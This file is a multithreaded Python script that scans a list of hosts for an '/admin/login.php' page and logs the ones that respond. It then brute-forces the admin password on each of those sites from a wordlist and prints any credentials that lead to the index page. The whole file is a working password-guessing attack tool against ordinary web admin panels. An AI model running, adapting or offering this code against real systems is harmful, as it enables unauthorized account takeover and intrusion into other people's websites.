#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import requests
from socket import *
import time
from random import randrange
from queue import Queue
# from multiprocessing import Queue
from threading import Thread
from requests.exceptions import HTTPError
from hashlib import md5
import logging
from OpenSSL import crypto
from requests import pyopenssl as reqs
import re
import urllib3

logpath = "./alive.txt"
ch = logging.FileHandler(logpath)
logger = logging.getLogger('log')
logger.setLevel(logging.INFO)
logger.addHandler(ch)

THREADS_COUNT = 15

proxies = { 'http' : '127.0.0.1:8080', 'https' : '127.0.0.1:8080' }

def get_user_agent():
    user_agent = {
        'User-agent': '"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15'}
    return user_agent

def main():
    setdefaulttimeout(15)
    q = Queue(maxsize=0)

#    with open("./target.txt") as ip:
#        target = [line.rstrip('\n') for line in ip]
#        for i in range(len(target)):
#            q.put_nowait((i, target[i]))
#
#    scan_thread(q)

    with open("./alive.txt") as ip:
        target = [line.rstrip('\n') for line in ip]

        for i in range(len(target)):
            with open("./password.txt") as txtpass:
                password = [line.rstrip('\n') for line in txtpass]
                for x in range(len(password)):
                    q.put_nowait((i, target[i], password[x]))

    start_thread(q)

def scan_thread(q):
    for i in range(THREADS_COUNT):
        worker = Thread(target=scanner, args=(q,))
        worker.setDaemon(True)
        worker.start()
    q.join()

def scanner(q, ):
    while not q.empty():
        item = q.get_nowait()
        urlscan(q, item[1])
        q.task_done()
    return True

def start_thread(q):
    for i in range(THREADS_COUNT):
        worker = Thread(target=processor, args=(q,))
        worker.setDaemon(True)
        worker.start()
    q.join()


def processor(q, ):
    while not q.empty():
        item = q.get_nowait()
        apply_payload(q, item[1], item[2])
        q.task_done()
    return True

def urlscan(q, domain):
    try:
        r = requests.get(domain + "/admin/login.php", timeout=5, allow_redirects=True, verify=False, proxies=proxies)
    except:
        pass
    else:
        if r.status_code == 200:
                logger.info("{}".format(r.url))

def apply_payload(q, session_url, password):
    try:
        r = requests.get(session_url, timeout=7, allow_redirects=True, verify=False)
    except:
        pass
    else:
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        payload = "username=admin&password={}&loginsubmit=Submit".format(password)
        session = requests.Session()
        session.headers.update(get_user_agent())
    try:
        response = session.post(r.url, data=payload, headers=headers, proxies=proxies, timeout=7, allow_redirects=True, verify=False)
        #if response.status_code == 302 or response.status_code == 200:
        if "index.php" in response.url:
            print("[+] {} // password: {}".format(r.url, password))

#        if 'admin/index.php' in response.url:
#            print("[+] {} // password = {}".format(session_url, password))

    except:
        pass

if __name__ == '__main__':
    verify = False,
    urllib3.disable_warnings()
    sys.exit(main())

